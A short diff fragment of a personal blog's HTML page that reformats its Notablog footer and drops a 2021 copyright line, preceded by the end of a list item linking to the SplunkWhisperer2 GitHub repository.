href="https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2">https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2</a></span></span></li></ol></article>
   <footer class="Footer">
-        <div>&copy; samiko@127.0.0.1~$ &centerdot; 2021</div>
-        <div>&centerdot;</div>
-        <div>Powered by <a href="https://github.com/dragonman225/notablog" target="_blank"
-            rel="noopener noreferrer">Notablog</a>.
-        </div>
-    </footer>
+  <div>samiko@127.0.0.1~$</div>
+  <div>&centerdot;</div>
+  <div>Powered by <a href="https://github.com/dragonman225/notablog" target="_blank" rel="noopener noreferrer">Notablog</a>.</div>
+</footer>
 </body>
 
 </html>
